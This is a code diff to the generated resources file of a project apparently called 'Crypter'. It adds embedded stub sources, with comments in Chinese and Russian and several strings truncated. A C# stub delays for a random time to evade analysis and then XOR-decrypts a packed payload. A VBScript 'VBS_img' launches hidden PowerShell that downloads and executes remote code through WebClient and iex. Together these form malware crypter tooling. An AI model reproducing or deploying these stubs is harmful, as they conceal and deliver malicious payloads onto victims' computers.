@@ -405,6 +405,30 @@ namespace Crypter.Properties {
         }
         
         /// <summary>
+        ///   查找类似 using System;
+        ///using System.Diagnostics;
+        ///using System.IO;
+        ///using System.Text;
+        ///using System.Threading;
+        ///using System.IO.Compression;
+        ///using System.Reflection;
+        ///
+        ///namespace StubEch
+        ///{
+        ///    class Program
+        ///    {
+        ///        static void Main(string[] args)
+        ///        {
+        ///            Thread.Sleep(new Random(Environment.TickCount).Next(500, 5500)); // Делаем рандомную задержку перед запуском
+        ///            byte[] encryptedBytes = StringToByteArray(XOR(DecompressString(&quot;[BYTES]&quot;))); // Сначала принимаем строку зашифрован [字符串的其余部分被截断]&quot;; 的本地化字符串。
+        /// </summary>
+        internal static string rc4_xor {
+            get {
+                return ResourceManager.GetString("rc4_xor", resourceCulture);
+            }
+        }
+        
+        /// <summary>
         ///   查找类似 Module ReFUD
         ///    Sub Main()
         ///        Dim B As String() = New String() {
@@ -428,7 +452,26 @@ namespace Crypter.Properties {
         }
         
         /// <summary>
-        ///   查找类似  的本地化字符串。
+        ///   查找类似 Dim Capony
+        ///Dim WshProcEnv
+        ///Dim process_architecture
+        /// 
+        ///Set Capony =  CreateObject(&quot;WScript.Shell&quot;)
+        ///Set WshProcEnv = Capony.Environment(&quot;Process&quot;)
+        /// 
+        ///process_architecture= WshProcEnv(&quot;PROCESSOR_ARCHITECTURE&quot;)
+        /// 
+        ///If process_architecture = &quot;x86&quot; Then   
+        ///    attack(&quot;Powershell&quot;)
+        ///Else   
+        ///    attack(&quot;C:\Windows\syswow64\Windowspowershell\v1.0\Powershell.exe&quot;)
+        ///End If
+        /// 
+        /// 
+        /// 
+        ///sub attack(S)
+        /// 
+        ///Capony.Run S +&quot; -noexit -C $cry = new-object Net.WebClient;iex $cry.DownloadString(&apos;123456&apos;)&quot;, CONSOLE_HIDE, CMD [字符串的其余部分被截断]&quot;; 的本地化字符串。
         /// </summary>
         internal static string VBS_img {
             get {
